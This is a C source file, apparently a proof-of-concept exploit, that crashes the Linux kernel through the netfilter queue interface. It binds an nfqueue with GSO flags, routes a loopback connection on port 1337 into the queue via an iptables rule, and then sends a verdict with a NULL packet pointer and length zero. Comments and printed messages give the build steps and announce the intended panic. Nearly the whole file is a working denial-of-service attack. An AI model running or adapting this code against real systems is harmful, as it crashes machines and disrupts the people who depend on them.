#include <arpa/inet.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/types.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>

//How to compile:
//cc panic6.c -o nfpanic -lmnl -lnetfilter_queue && sudo setcap "CAP_NET_ADMIN+ep" ./nfpanic && ./nfpanic

int socket_conn(uint16_t port)
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;
   
    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sockfd == -1) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }
    bzero(&servaddr, sizeof(servaddr));
   
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(port);
   
    // connect the client socket to server socket
    connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
}

int main(int argc, char *argv[])
{
	size_t BUF_SIZE = 0xffff+(MNL_SOCKET_BUFFER_SIZE/2);
	char buf[BUF_SIZE];
	uint16_t queue_num = 1337;
	struct nlmsghdr *nlh;

	puts("[*] Creating the socket with the kernel");
	struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) {
		perror( "mnl_socket_open" );
		exit(EXIT_FAILURE);
	}
	puts("[*] Binding the socket");
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror( "mnl_socket_bind" );
		exit(EXIT_FAILURE);
	}

	printf("[*] Sending the BIND command for the nfqueue %d\n",queue_num);
	nlh = nfq_nlmsg_put(buf, NFQNL_MSG_CONFIG, queue_num);
	nfq_nlmsg_cfg_put_cmd(nlh, AF_INET, NFQNL_CFG_CMD_BIND);
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror( "mnl_socket_send" );
		exit(EXIT_FAILURE);
	}

	puts("[*] Setting config to COPY_META mode");
	nlh = nfq_nlmsg_put(buf, NFQNL_MSG_CONFIG, queue_num);
	nfq_nlmsg_cfg_put_params(nlh, NFQNL_COPY_META, 0xffff);
	mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(NFQA_CFG_F_GSO));
	mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(NFQA_CFG_F_GSO));
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror( "mnl_socket_send" );
		exit(EXIT_FAILURE);
	}
	
	printf("[*] You need to associate to this queue the port 1337: sudo iptables -t mangle -A PREROUTING -j NFQUEUE -p tcp --dport 1337 --queue-num %d\n", queue_num);
	puts("Press ENTER to contiune (and panic)");
	getchar();

	puts("[*] Sending a connection packet to nfqueue");
	socket_conn(1337);

	
	puts("[*] Waiting for a packet in the nfqueue");
	if (mnl_socket_recvfrom(nl, buf, BUF_SIZE) == -1) {
		perror( "mnl_socket_recvfrom" );
		exit(EXIT_FAILURE);
	}

	puts("[*] Sending the verdict with a NULL pointer and len = 0");
	nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);
	nfq_nlmsg_verdict_put_pkt(nlh, NULL, 0);
	nfq_nlmsg_verdict_put(nlh, 1, NF_ACCEPT );

	puts("[*] Sending the verdict to the kernel, Good panic :D");
	sleep(1); //Only to see the print
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror( "mnl_socket_send" );
		exit(EXIT_FAILURE);
	}
	puts("[*] Are you still alive?");
	
}


